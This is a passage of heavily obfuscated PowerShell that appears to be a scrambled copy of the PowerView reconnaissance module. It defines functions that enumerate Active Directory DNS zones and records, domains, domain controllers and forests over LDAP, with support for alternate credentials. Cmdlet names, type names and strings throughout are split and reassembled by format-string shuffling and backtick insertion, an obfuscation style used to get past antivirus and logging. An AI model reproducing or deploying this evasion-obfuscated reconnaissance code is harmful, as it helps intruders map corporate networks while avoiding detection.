            ${DN`s`REcO`RdO`BJECT} | &("{1}{3}{2}{0}" -f'r','A','e','dd-Memb') ("{2}{0}{1}{3}"-f 'o','teprope','N','rty') ("{2}{1}{0}" -f'cordType','e','R') 'NS'
        }

        elseif (${R`d`AtatYPE} -eq 5) {
            ${a`L`Ias} = &("{1}{0}{2}" -f 'am','Get-N','e') ${dnsRe`C`O`Rd}[24..${D`Ns`ReCORd}."L`ENg`TH"]
            ${D`AtA} = ${AlI`As}
            ${dN`sR`E`CoRdo`BJEct} | &("{2}{1}{0}{3}"-f 'Mem','dd-','A','ber') ("{3}{1}{2}{0}" -f 'ty','teprope','r','No') ("{1}{2}{3}{0}" -f'e','Reco','rdT','yp') ("{1}{0}" -f'E','CNAM')
        }

        elseif (${RD`A`TatY`Pe} -eq 6) {
            
            ${d`AtA} = $(  $tUL1::"toBa`sE`64sTRINg"(${d`NsrEco`RD}[24..${D`N`s`ReCORD}."lE`NgtH"]))
            ${DNSreC`ordO`BjE`Ct} | &("{1}{3}{0}{2}"-f 'd','A','-Member','d') ("{0}{1}{3}{2}"-f'Note','prop','ty','er') ("{3}{2}{1}{0}"-f'ordType','c','e','R') 'SOA'
        }

        elseif (${rDA`T`ATYpE} -eq 12) {
            ${P`TR} = &("{2}{0}{1}" -f't-','Name','Ge') ${DNsr`Ec`ord}[24..${DnSRe`Co`RD}."Le`N`gTH"]
            ${D`ATa} = ${p`TR}
            ${dNsrE`Cor`dObje`Ct} | &("{2}{0}{1}"-f 'dd-Me','mber','A') ("{2}{0}{3}{1}" -f'pr','erty','Note','op') ("{2}{0}{1}" -f 'ecordTyp','e','R') 'PTR'
        }

        elseif (${rdA`T`AtYPe} -eq 13) {
            
            ${d`ATA} = $(  $tUL1::"TO`Ba`sE64`sTrInG"(${D`N`Sre`COrD}[24..${DN`s`ReCorD}."L`e`NGTH"]))
            ${DN`srecORDo`BJ`eCt} | &("{3}{1}{0}{2}" -f 'e','d-M','mber','Ad') ("{2}{3}{1}{0}"-f'perty','ro','Note','p') ("{2}{0}{1}" -f 'cordTy','pe','Re') ("{0}{1}"-f 'HINF','O')
        }

        elseif (${RdAt`AT`YPe} -eq 15) {
            
            ${DA`TA} = $(  $tUl1::"to`BASE`64STriNG"(${DNs`R`Eco`RD}[24..${Dns`R`ecOrd}."LeNG`TH"]))
            ${DN`sreCoRdO`B`Je`ct} | &("{2}{1}{0}" -f'er','emb','Add-M') ("{2}{3}{0}{1}" -f'opert','y','Notep','r') ("{0}{1}{2}"-f'Rec','ordTyp','e') 'MX'
        }

        elseif (${Rd`At`AtyPe} -eq 16) {
            [string]${t`xt}  = ''
            [int]${S`EG`mentle`N`gtH} = ${D`Nsr`EcO`Rd}[24]
            ${in`d`EX} = 25

            while (${SE`gmE`Nt`L`eNgTh}-- -gt 0) {
                ${t`XT} += [char]${d`NS`RecoRd}[${IN`dEX}++]
            }

            ${Da`TA} = ${t`XT}
            ${DnSReC`oRd`OB`ject} | &("{0}{3}{1}{2}" -f 'Add','Mem','ber','-') ("{3}{1}{2}{0}"-f'y','p','ert','Notepro') ("{1}{0}{2}"-f'ec','R','ordType') 'TXT'
        }

        elseif (${RD`ATa`TYpe} -eq 28) {
            
            ${d`AtA} = $(  ( GeT-vAriABLe  tul1).VALUE::"to`BASE64sT`R`Ing"(${dnsr`e`C`ord}[24..${Dn`sRec`Ord}."LeNg`TH"]))
            ${D`NsRECor`d`oB`jecT} | &("{0}{1}{2}" -f'A','dd-','Member') ("{0}{1}{2}{3}"-f'N','o','tepro','perty') ("{2}{0}{1}" -f'ordT','ype','Rec') ("{0}{1}"-f'AA','AA')
        }

        elseif (${RDAt`A`TYpE} -eq 33) {
            
            ${D`AtA} = $(  ( GET-VARiAbLe  ("Tul"+"1")  -VaLUeO  )::"t`obAse`6`4StrING"(${Dn`Sr`EcOrD}[24..${d`N`SrecORd}."l`en`gTh"]))
            ${D`N`SReCO`Rdob`jECt} | &("{1}{2}{0}"-f'ber','A','dd-Mem') ("{1}{0}{2}"-f'r','Noteprope','ty') ("{2}{0}{1}"-f 'Ty','pe','Record') 'SRV'
        }

        else {
            ${D`ATA} = $( (  GcI VArIabLe:TuL1 ).vALUe::"tOBas`E`64sT`RING"(${DNsrE`CO`Rd}[24..${dn`srecO`RD}."L`eNgTH"]))
            ${d`NSRECO`Rd`ObjECt} | &("{0}{2}{1}" -f'Ad','ember','d-M') ("{1}{2}{0}{3}" -f 'rop','N','otep','erty') ("{0}{1}{2}"-f'Recor','dTyp','e') ("{1}{0}" -f 'OWN','UNKN')
        }

        ${Dns`Re`cORd`oBjECt} | &("{3}{2}{0}{1}" -f 'b','er','m','Add-Me') ("{1}{0}{2}" -f 'roper','Notep','ty') ("{0}{3}{2}{1}"-f 'UpdatedAtS','al','i','er') ${Upd`AteDa`TSe`RIaL}
        ${dNSRecorDo`Bj`E`CT} | &("{2}{1}{0}"-f 'Member','d-','Ad') ("{0}{3}{1}{2}"-f 'Not','roper','ty','ep') 'TTL' ${T`Tl}
        ${DNsreCo`RdO`BJ`e`Ct} | &("{0}{1}{2}" -f 'Add-Me','mbe','r') ("{0}{2}{1}{3}"-f 'N','p','otepro','erty') 'Age' ${a`gE}
        ${DNsrEc`ORD`OB`JECt} | &("{0}{1}{2}" -f'A','dd-Me','mber') ("{0}{3}{1}{2}" -f 'Notep','e','rty','rop') ("{0}{1}" -f 'Time','Stamp') ${TiME`st`AmP}
        ${dN`sre`CordO`BJECT} | &("{3}{2}{0}{1}"-f '-','Member','dd','A') ("{0}{3}{2}{1}" -f 'Notep','y','ert','rop') ("{1}{0}" -f 'ta','Da') ${DA`TA}
        ${D`NSre`CORdo`BjeCT}
    }
}


function gE`T`-`DOMaI`NDnSZoNE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}"-f'es','PSShou','ldProc','s'}, '')]
    [OutputType({"{3}{1}{0}{2}" -f'werView','o','.DNSZone','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsItion = 0, VaLUeFRompipeLINE = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`mA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}"-f'er','mainContr','Do','oll'})]
        [String]
        ${SER`V`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRO`PERtI`ES},

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSultp`A`GESi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`V`ert`imELIm`It},

        [Alias({"{1}{0}"-f 'rnOne','Retu'})]
        [Switch]
        ${fINDO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`DeNt`i`Al} =  $21Gv7E::"emp`Ty"
    )

    PROCESS {
        ${seAR`CheRAr`gU`meN`TS} = @{
            ("{2}{1}{0}"-f 'ter','il','LDAPF') = ("{3}{2}{5}{0}{1}{6}{4}" -f 'd','nsZon','bjectClass','(o',')','=','e')
        }
        if (${pS`BouNdP`AR`AM`Et`ErS}[("{0}{1}"-f 'Do','main')]) { ${S`Ear`CH`eRArg`UMENtS}[("{1}{0}" -f 'in','Doma')] = ${d`oMA`iN} }
        if (${PsBO`UNDPArA`Met`eRs}[("{0}{1}"-f 'Se','rver')]) { ${S`E`A`RCHerArGumEnTS}[("{1}{0}" -f'ver','Ser')] = ${SERv`er} }
        if (${P`sb`OUndPa`Ram`etErS}[("{0}{1}{2}"-f'P','ro','perties')]) { ${se`Ar`cH`ERarGum`ENts}[("{3}{1}{2}{0}"-f 'erties','r','op','P')] = ${Pr`oPE`Rt`IeS} }
        if (${pSboUn`dP`ARAmEt`eRs}[("{0}{2}{3}{1}"-f 'Result','e','PageSi','z')]) { ${s`EARc`H`E`Rarg`Uments}[("{1}{0}{2}{3}" -f 'ltP','Resu','a','geSize')] = ${RE`SULtPag`ES`IZe} }
        if (${pS`B`oU`N`DpARAmETERs}[("{1}{4}{0}{2}{3}" -f 'meL','Server','im','it','Ti')]) { ${SE`A`RchE`R`ArGUMEN`TS}[("{0}{4}{1}{2}{3}"-f'Ser','imeLi','mi','t','verT')] = ${SER`V`e`RtIm`elImIt} }
        if (${p`sBo`UN`DpaRaMeTers}[("{2}{1}{0}{3}" -f'i','ent','Cred','al')]) { ${sE`ARCHe`R`ArG`UME`NTS}[("{2}{0}{1}"-f'i','al','Credent')] = ${CR`Ed`En`TiaL} }
        ${D`NSse`ARcHE`R1} = &("{2}{4}{0}{3}{1}" -f'inSea','r','Get-Do','rche','ma') @SearcherArguments

        if (${D`NssEA`R`ChER1}) {
            if (${psBO`U`N`dpAra`meT`ErS}[("{0}{1}" -f'F','indOne')]) { ${rEs`U`Lts} = ${d`Ns`sea`RchEr1}.("{1}{0}"-f 'dOne','Fin').Invoke()  }
            else { ${resU`lTS} = ${dNSSE`ARc`hEr1}.("{0}{1}" -f'Find','All').Invoke() }
            ${R`esul`Ts} | &("{2}{1}{0}{3}"-f 'ere-Obje','h','W','ct') {${_}} | &("{3}{1}{2}{4}{0}"-f'ect','or','Each-Ob','F','j') {
                ${O`Ut} = &("{2}{1}{0}{3}" -f'ro','ert-LDAPP','Conv','perty') -Properties ${_}."PRO`PE`RT`ies"
                ${O`UT} | &("{2}{0}{1}"-f'emb','er','Add-M') ("{3}{2}{1}{0}" -f'roperty','eP','ot','N') ("{0}{1}" -f'ZoneNam','e') ${O`Ut}."NA`mE"
                ${O`UT}."p`sOb`JecT"."t`ype`N`AmES".("{0}{1}{2}"-f'In','s','ert').Invoke(0, ("{1}{3}{0}{2}"-f'DNSZon','PowerV','e','iew.'))
                ${O`Ut}
            }

            if (${r`EsU`LTs}) {
                try { ${rESU`lts}.("{1}{0}"-f 'se','dispo').Invoke() }
                catch {
                    &("{0}{2}{1}{3}" -f 'Write-V','rbo','e','se') ('[Get'+'-Doma'+'inDF'+'SSh'+'are] '+'E'+'rror '+'dis'+'pos'+'ing '+'o'+'f '+'the'+' '+'Re'+'sults '+'ob'+'ject: '+"$_")
                }
            }
            ${D`Nss`EARCHe`R1}.("{1}{0}{2}" -f 'pos','dis','e').Invoke()
        }

        ${S`eARCheR`ARg`U`mENtS}[("{2}{0}{1}{4}{3}"-f 'Ba','s','Search','refix','eP')] = ("{8}{4}{0}{3}{5}{6}{1}{2}{7}" -f'osoftDNS,','m','ain','DC','cr','=','Do','DnsZones','CN=Mi')
        ${dNssEa`Rche`R2} = &("{1}{0}{3}{2}"-f't-DomainSearc','Ge','er','h') @SearcherArguments

        if (${dNSSE`Ar`ch`ER2}) {
            try {
                if (${PsB`O`U`NdParameT`ERs}[("{1}{0}{2}"-f'n','FindO','e')]) { ${re`sUl`TS} = ${d`NSSEa`RChe`R2}.("{0}{1}"-f'FindO','ne').Invoke() }
                else { ${rE`SUl`Ts} = ${Dns`s`EArcHe`R2}.("{2}{1}{0}" -f 'll','indA','F').Invoke() }
                ${reS`U`lTS} | &("{2}{0}{1}"-f 'ere-Objec','t','Wh') {${_}} | &("{0}{3}{4}{1}{2}" -f'F','ch-','Object','or','Ea') {
                    ${O`Ut} = &("{2}{1}{0}{3}"-f 'LDAPProp','t-','Conver','erty') -Properties ${_}."pROPer`TI`Es"
                    ${o`Ut} | &("{3}{0}{2}{1}"-f 'dd','Member','-','A') ("{1}{0}{2}{3}"-f'e','NoteProp','rt','y') ("{1}{2}{0}"-f'ame','Zon','eN') ${o`Ut}."n`AMe"
                    ${o`UT}."pS`obJ`ect"."TY`pENa`Mes".("{1}{0}"-f 't','Inser').Invoke(0, ("{3}{0}{1}{5}{4}{2}"-f 'werV','i','DNSZone','Po','w.','e'))
                    ${o`Ut}
                }
                if (${Res`U`LTs}) {
                    try { ${R`E`sULts}.("{1}{2}{0}" -f'e','di','spos').Invoke() }
                    catch {
                        &("{2}{0}{1}"-f'te-Verbos','e','Wri') ('['+'Get-Doma'+'i'+'nDNSZone] '+'E'+'r'+'ror '+'di'+'s'+'pos'+'ing '+'o'+'f '+'the'+' '+'Re'+'sults'+' '+'ob'+'ject'+': '+"$_")
                    }
                }
            }
            catch {
                &("{4}{1}{3}{0}{2}" -f 'rb','ite','ose','-Ve','Wr') ((("{0}{14}{4}{16}{12}{13}{6}{11}{2}{9}{15}{18}{10}{1}{5}{3}{17}{8}{7}"-f '[G','DNS,DC=D','P6qC','on','NS','omainDnsZ','cessin','6q','P','N=M','ft','g ','ne] Error ','ac','et-DomainD','icro','Zo','es','so'))."RePL`AcE"(([cHar]80+[cHar]54+[cHar]113),[stRing][cHar]39))
            }
            ${DNsSE`ARC`H`ER2}.("{1}{0}"-f'ose','disp').Invoke()
        }
    }
}


function GE`T-`dom`AiNDn`S`ReCO`RD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}"-f'ss','PSSho','uldProc','e'}, '')]
    [OutputType({"{0}{2}{3}{1}"-f'P','d','owerView.DN','SRecor'})]
    [CmdletBinding()]
    Param(
        [Parameter(posITiOn = 0,  mAnDATory = ${Tr`UE}, vALUeFrOmpiPElINe = ${t`RUE}, vaLUeFrOmpiPELinEBYprOpERtyNAMe = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${z`OneNAmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`Om`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{0}{2}{3}"-f 't','Doma','ro','ller','inCon'})]
        [String]
        ${SerV`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRoPe`R`TIes} = ("{2}{0}{1}{6}{3}{10}{5}{4}{8}{7}{9}"-f 'stin','guishedname,dns','name,di','rd,wh','d,whe','e','reco','ang','nch','ed','encreat'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResUlT`PaGe`s`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RveRTImel`imIt},

        [Alias({"{1}{0}{2}" -f 'tur','Re','nOne'})]
        [Switch]
        ${fIndO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DeN`TIAl} =   ( geT-vArIABLe  21gv7E -vAlu)::"E`MPtY"
    )

    PROCESS {
        ${s`EA`RC`hEraRgumEnTs} = @{
            ("{2}{0}{1}"-f'Filt','er','LDAP') = ("{0}{4}{2}{1}{3}" -f'(ob','Class=dnsNo','ect','de)','j')
            ("{1}{0}{2}"-f'earchB','S','asePrefix') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${PsB`O`Und`PARAm`eTerS}[("{2}{0}{1}"-f'omai','n','D')]) { ${sEArC`hERAR`G`Um`enTs}[("{1}{0}"-f'n','Domai')] = ${DoM`A`In} }
        if (${psbO`UndPa`R`AMetE`Rs}[("{0}{2}{1}"-f'S','r','erve')]) { ${se`A`RCHeRAR`GU`me`NTS}[("{0}{1}"-f'Ser','ver')] = ${sER`V`Er} }
        if (${P`SBouNDPARA`METE`RS}[("{1}{0}{2}" -f'e','Prop','rties')]) { ${S`eArCHeRAr`gU`meNTs}[("{1}{0}{2}"-f 'r','P','operties')] = ${p`R`OPe`RtiEs} }
        if (${PSBOU`Ndpar`AM`E`T`ErS}[("{1}{2}{3}{0}"-f 'ize','Re','sultP','ageS')]) { ${SEA`R`cHErAR`GUmeN`Ts}[("{2}{1}{0}{3}" -f 'tPage','ul','Res','Size')] = ${RES`Ul`T`PagesiZe} }
        if (${PSBoUnDpA`RA`ME`TErs}[("{1}{3}{2}{0}"-f 'it','Server','im','TimeL')]) { ${sE`A`RCHE`R`A`RgUMenTs}[("{2}{1}{0}{3}" -f 'verTimeL','r','Se','imit')] = ${S`ERvE`RTiMe`limIt} }
        if (${psbOUnD`pARAmEt`E`RS}[("{1}{0}{2}" -f'edenti','Cr','al')]) { ${S`eaR`CHErArgUMe`N`TS}[("{0}{2}{1}"-f'Cred','tial','en')] = ${cR`edEnTI`Al} }
        ${DnS`S`eARcHer} = &("{2}{0}{1}{3}"-f 'inSe','ar','Get-Doma','cher') @SearcherArguments

        if (${D`NSSEAr`c`HeR}) {
            if (${pS`B`Ou`NDpARam`ETeRs}[("{1}{2}{0}" -f 'One','Fi','nd')]) { ${R`es`ULTs} = ${DNSS`EAR`cH`eR}.("{0}{1}{2}"-f 'F','i','ndOne').Invoke() }
            else { ${RE`SU`ltS} = ${d`NSS`Ea`RCHEr}.("{0}{1}" -f'FindAl','l').Invoke() }
            ${rE`sULts} | &("{0}{2}{1}" -f 'Where-Ob','ect','j') {${_}} | &("{2}{3}{0}{1}" -f'ach-Objec','t','For','E') {
                try {
                    ${O`UT} = &("{5}{3}{6}{2}{4}{1}{0}"-f'ty','oper','LDAPP','ert','r','Conv','-') -Properties ${_}."P`RO`peRtIES" | &("{3}{0}{2}{1}" -f 'lec','bject','t-O','Se') ("{0}{1}" -f 'na','me'),("{3}{2}{0}{5}{1}{4}" -f 'i','dnam','t','dis','e','nguishe'),("{0}{1}{2}{3}"-f 'dns','re','co','rd'),("{2}{0}{1}{3}"-f'e','ate','whencr','d'),("{0}{1}{2}" -f 'w','henchan','ged')
                    ${o`Ut} | &("{2}{1}{0}"-f'er','mb','Add-Me') ("{0}{2}{1}" -f 'NotePr','perty','o') ("{2}{0}{1}" -f'm','e','ZoneNa') ${zo`NE`NAMe}

                    
                    if (${O`UT}."DNsReCO`RD" -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        ${rECo`Rd} = &("{1}{4}{2}{3}{0}" -f 'd','Convert-DNSRe','o','r','c') -DNSRecord ${O`UT}."d`N`SrEcorD"[0]
                    }
                    else {
                        ${R`E`CoRD} = &("{1}{3}{2}{0}"-f 'rd','Conv','o','ert-DNSRec') -DNSRecord ${o`UT}."dNS`Re`CoRd"
                    }

                    if (${re`coRD}) {
                        ${REc`oRd}."pSoB`JE`ct"."p`R`op`ErTiES" | &("{3}{0}{2}{1}"-f'a','ct','ch-Obje','ForE') {
                            ${o`Ut} | &("{2}{1}{0}"-f 'ber','em','Add-M') ("{0}{3}{1}{2}"-f 'Not','Pr','operty','e') ${_}."Na`me" ${_}."va`lUe"
                        }
                    }

                    ${o`UT}."PSob`JE`cT"."tYP`En`AMes".("{1}{0}"-f'ert','Ins').Invoke(0, ("{2}{3}{4}{0}{1}"-f 'Recor','d','Pow','erVi','ew.DNS'))
                    ${O`UT}
                }
                catch {
                    &("{0}{1}{2}" -f 'Write-War','nin','g') ('[Get-Do'+'mai'+'nDNSRe'+'cord'+']'+' '+'Er'+'ror: '+"$_")
                    ${o`Ut}
                }
            }

            if (${RES`U`LtS}) {
                try { ${reSU`lTS}.("{0}{1}"-f'dispo','se').Invoke() }
                catch {
                    &("{2}{0}{1}{4}{3}" -f'te-','Ve','Wri','se','rbo') ('[G'+'et-'+'Dom'+'ainDNS'+'Re'+'cord]'+' '+'Erro'+'r '+'dispo'+'sin'+'g '+'of'+' '+'the'+' '+'Resu'+'l'+'ts '+'ob'+'jec'+'t: '+"$_")
                }
            }
            ${dNsseA`Rc`HeR}.("{1}{0}"-f 'se','dispo').Invoke()
        }
    }
}


function g`Et-`DOmAiN {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItION = 0, valUEFroMpIpElINE = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMa`in},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`DE`NTial} =   (  gEt-vARIABLe  21GV7E  ).VAluE::"eM`pty"
    )

    PROCESS {
        if (${psbOu`ND`ParAmET`ERS}[("{1}{0}{2}" -f'ed','Cr','ential')]) {

            &("{0}{3}{1}{2}"-f 'Wri','erbo','se','te-V') ("{2}{0}{1}{5}{4}{7}{6}{8}{3}" -f'Get-Doma','in] ','[','Domain','lt','Using a','rnate credentials for Get','e','-')

            if (${Psb`OUndP`Aram`EtERS}[("{1}{0}"-f'in','Doma')]) {
                ${Tar`G`etdOM`A`In} = ${Doma`IN}
            }
            else {
                
                ${taRGE`T`dOMaIN} = ${cRed`E`NTiAl}.("{3}{4}{6}{0}{1}{2}{5}"-f 'd','ent','i','Ge','tNetw','al','orkCre').Invoke()."do`mA`In"
                &("{3}{0}{1}{2}"-f '-V','er','bose','Write') ('[G'+'e'+'t-D'+'omai'+'n] '+'Extra'+'ct'+'ed '+'dom'+'ain '+"'$TargetDomain' "+'from'+' '+'-'+'Credentia'+'l')
            }

            ${d`oMaiNcO`Nte`xT} = &("{2}{1}{0}" -f 'ect','-Obj','New') ("{9}{13}{8}{1}{10}{7}{14}{4}{11}{0}{3}{12}{2}{6}{5}{15}"-f 'ir','.Direc','r','e','ces.Activ','nt','ectoryCo','er','em','S','toryS','eD','ctory.Di','yst','vi','ext')(("{1}{0}"-f 'main','Do'), ${TAr`GEtDOM`AIN}, ${CREd`ENTi`Al}."uSern`A`ME", ${crE`DENti`Al}.("{3}{0}{1}{4}{2}"-f 't','Net','dential','Ge','workCre').Invoke()."p`ASswO`RD")

            try {
                  ( GET-iTEM  VaRiAbLe:P19ztd  ).VAlUe::("{2}{0}{1}"-f 'om','ain','GetD').Invoke(${DO`mAIN`CONteXT})
            }
            catch {
                &("{1}{2}{0}"-f 'Verbose','Write','-') ('[Get-D'+'o'+'mai'+'n'+'] '+'Th'+'e '+'specifi'+'ed'+' '+'domai'+'n '+"'$TargetDomain' "+'doe'+'s '+'n'+'ot '+'exi'+'st, '+'could'+' '+'not'+' '+'be'+' '+'conta'+'c'+'te'+'d, '+'there'+' '+('is'+'n{'+'0'+'}t ') -f  [Char]39+'a'+'n '+'existi'+'ng'+' '+'t'+'rust, '+'or'+' '+'the'+' '+'spe'+'cifi'+'ed '+'crede'+'nt'+'ial'+'s '+'ar'+'e '+'i'+'nvalid'+': '+"$_")
            }
        }
        elseif (${p`SBOUNdPa`RamE`T`e`RS}[("{0}{1}"-f'Doma','in')]) {
            ${d`oMai`NconT`Ext} = &("{2}{0}{1}"-f'bjec','t','New-O') ("{11}{5}{8}{0}{12}{6}{1}{9}{13}{2}{3}{7}{10}{4}"-f 'c','s.Active','recto','ryC','t','em.D','e','ont','ire','Di','ex','Syst','toryServic','rectory.Di')(("{0}{1}"-f 'Domai','n'), ${D`Om`AIn})
            try {
                 (  gI  ("vARi"+"aBl"+"E:p"+"1"+"9Ztd") ).VAluE::("{0}{1}{2}" -f'G','e','tDomain').Invoke(${DoMAin`co`Nt`Ext})
            }
            catch {
                &("{2}{0}{3}{1}"-f'erb','e','Write-V','os') ('['+'Get-D'+'omain] '+'The'+' '+'speci'+'fied'+' '+'do'+'main'+' '+"'$Domain' "+'d'+'oes '+'n'+'ot '+'e'+'xist,'+' '+'co'+'uld'+' '+'n'+'ot '+'be'+' '+'cont'+'a'+'cted,'+' '+'o'+'r '+'there'+' '+('is'+'n{'+'0}'+'t ')  -F[CHar]39+'an'+' '+'exi'+'st'+'in'+'g '+'t'+'rust '+': '+"$_")
            }
        }
        else {
            try {
                  $p19ZTD::("{2}{0}{1}{3}{4}" -f 'tCu','rrentDo','Ge','m','ain').Invoke()
            }
            catch {
                &("{0}{3}{1}{4}{2}" -f'Wri','Ve','e','te-','rbos') ('['+'Get-Domain'+'] '+'Er'+'ror '+'ret'+'r'+'ieving'+' '+'t'+'he '+'curr'+'e'+'nt '+'domai'+'n:'+' '+"$_")
            }
        }
    }
}


function g`eT-DOMainCoNt`R`oller {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}"-f'ess','u','ldProc','PSSho'}, '')]
    [OutputType({"{3}{2}{1}{0}"-f'r','View.Compute','ower','P'})]
    [OutputType({"{3}{6}{0}{2}{5}{8}{9}{1}{4}{10}{7}"-f'ct','ve','or','System.Di','Dire','ySer','re','.DomainController','vices.Ac','ti','ctory'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITiOn = 0, VaLUefrOmpIPEliNe = ${t`RUE})]
        [String]
        ${DOM`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{5}{3}{2}{4}{1}" -f'DomainC','r','l','ntrol','e','o'})]
        [String]
        ${S`ERV`eR},

        [Switch]
        ${ld`AP},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`dE`NTiAL} =  (  gcI  ("VArIaB"+"le"+":"+"21gv7e") ).VaLUe::"EM`PTy"
    )

    PROCESS {
        ${a`RGume`NtS} = @{}
        if (${Ps`B`oUnDp`A`RAmEtE`RS}[("{0}{1}"-f'Dom','ain')]) { ${ARGuME`N`TS}[("{0}{1}" -f'Do','main')] = ${d`O`MAiN} }
        if (${psBo`UNDParAM`e`TERs}[("{2}{0}{1}" -f'i','al','Credent')]) { ${aR`GUme`NtS}[("{0}{1}{3}{2}" -f 'C','reden','l','tia')] = ${CR`eDenT`I`Al} }

        if (${PsBoun`d`PaRAmete`RS}[("{0}{1}"-f'LDA','P')] -or ${PSboun`Dp`AraMeT`ERS}[("{1}{0}" -f'rver','Se')]) {
            if (${PSB`O`Und`PARa`mEtErS}[("{0}{1}" -f 'S','erver')]) { ${aRg`UME`NtS}[("{1}{2}{0}"-f 'r','Ser','ve')] = ${SeR`VeR} }

            
            ${A`RGUm`EN`Ts}[("{2}{0}{1}" -f 'DAPFil','ter','L')] = (("{2}{4}{6}{3}{5}{10}{9}{8}{1}{11}{7}{0}"-f '8192)','3556.','(userAcco','nt','untC','r','o','4.803:=','.11','.840','ol:1.2','1.'))

            &("{3}{0}{1}{5}{2}{4}" -f'et-Doma','inC','e','G','r','omput') @Arguments
        }
        else {
            ${Fo`Un`DdoM`Ain} = &("{2}{3}{1}{0}"-f 'in','-Doma','G','et') @Arguments
            if (${fOUNdd`o`Main}) {
                ${FO`UN`Ddo`MAin}."DOM`AI`NC`OntROLLers"
            }
        }
    }
}


function Ge`T-fOR`est {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}"-f 'PSShou','cess','o','ld','Pr'}, '')]
    [OutputType({"{6}{5}{8}{3}{1}{7}{2}{9}{4}{0}" -f 'bject','ati','.PSCust','om','O','Management.','System.','on','Aut','om'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSITion = 0, VaLuefroMpiPelINe = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${forE`St},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REd`enT`iaL} =  (  vArIaBlE  ("21"+"gv7e") -vALueo)::"E`mPty"
    )

    PROCESS {
        if (${Psb`oUnD`pA`RAme`TerS}[("{2}{1}{0}" -f'l','edentia','Cr')]) {

            &("{0}{2}{1}" -f'Write-Ve','e','rbos') ("{8}{11}{7}{5}{6}{12}{9}{14}{3}{4}{13}{0}{2}{10}{1}"-f'n','et-Forest','tial','cr','ed','e','st','For','[G',' alternate','s for G','et-','] Using','e',' ')

            if (${pSb`OUn`d`PaRAmEtERs}[("{1}{0}" -f 'rest','Fo')]) {
                ${TArGe`T`For`esT} = ${Fo`Rest}
            }
            else {
                
                ${tA`RGetf`OReSt} = ${Cr`eDen`TiAl}.("{4}{2}{5}{3}{0}{1}"-f'ti','al','etwo','Creden','GetN','rk').Invoke()."Do`maiN"
                &("{3}{0}{1}{2}"-f'e','rb','ose','Write-V') ('[Ge'+'t-'+'For'+'est] '+'E'+'xtracted'+' '+'do'+'main '+"'$Forest' "+'fr'+'om '+'-'+'Cr'+'ede'+'ntial')
            }

            ${fOR`eSt`CoNt`eXT} = &("{0}{2}{1}"-f 'N','Object','ew-') ("{5}{1}{9}{10}{8}{6}{4}{2}{3}{7}{0}"-f 'ntext','ystem.Directo','t','ory','eDirectory.Direc','S','v','Co','i','r','yServices.Act')(("{1}{0}"-f'orest','F'), ${tARG`E`TfOresT}, ${CreDEN`T`i`AL}."uS`ern`Ame", ${cR`edENT`ial}.("{1}{3}{2}{5}{0}{6}{4}"-f'nt','Get','C','Network','al','rede','i').Invoke()."p`ASswo`Rd")

            try {
                ${fOReST`O`BjE`cT} =  ( gcI VArIaBle:hT9  ).ValUe::("{1}{2}{0}"-f'orest','Get','F').Invoke(${Fo`RE`STCO`Nte`Xt})
            }
            catch {
                &("{0}{2}{1}"-f 'Write-Verb','e','os') ('['+'Get'+'-Forest] '+'Th'+'e '+'speci'+'fi'+'ed '+'fo'+'r'+'est '+"'$TargetForest' "+'does'+' '+'n'+'ot '+'e'+'xist, '+'c'+'o'+'uld '+'no'+'t '+'be'+' '+'contac'+'t'+'e'+'d, '+'the'+'re '+('isnP8Ht ')."RePlA`ce"('P8H',[STRinG][cHAr]39)+'a'+'n '+'exi'+'sti'+'n'+'g '+'tru'+'st, '+'or'+' '+'t'+'he '+'s'+'pec'+'ified '+'credent'+'ia'+'l'+'s '+'a'+'re '+'i'+'nvalid'+': '+"$_")
                ${nU`Ll}
            }
        }
        elseif (${PS`BoUN`dp`ARAmEteRS}[("{2}{0}{1}"-f'e','st','For')]) {
            ${FOr`e`st`ConTExT} = &("{2}{1}{0}"-f'bject','w-O','Ne') ("{0}{1}{3}{16}{13}{14}{7}{12}{11}{4}{15}{10}{5}{6}{2}{8}{9}"-f'S','ystem.D','ont','i','recto','rector','yC','v','e','xt','Di','Di','ices.Active','o','rySer','ry.','rect')(("{0}{1}" -f 'F','orest'), ${f`oresT})
            try {
                ${FoRES`T`obj`ECT} =   ( get-VARIABle  ("h"+"t9")  -valU )::("{2}{0}{1}" -f 'et','Forest','G').Invoke(${FOr`ESTcon`T`exT})
            }
            catch {
